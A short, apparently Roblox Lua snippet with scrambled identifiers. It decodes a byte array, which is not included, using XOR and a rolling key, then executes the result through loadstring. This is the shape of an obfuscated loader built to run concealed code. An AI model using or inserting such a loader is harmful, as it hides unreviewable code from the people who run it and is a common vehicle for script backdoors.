local ltakcp69,pmpxbk14=160,51
local hhotcy73={}
for omlreq66=1,#rjtmln93 do
  local ouwils84=rjtmln93[omlreq66]
  ouwils84=bit32.bxor(ouwils84,pmpxbk14)
  ouwils84=(ouwils84-ltakcp69+256)%256
  hhotcy73[omlreq66]=ouwils84
  ltakcp69=(ltakcp69*13+7)%256;pmpxbk14=(pmpxbk14*17+11)%256
end
local bxdulq91=""
for omlreq66=1,#hhotcy73 do bxdulq91=bxdulq91..string.char(hhotcy73[omlreq66])end
local _f,_e=loadstring(bxdulq91)
if _f then _f() else warn(tostring(_e)) end
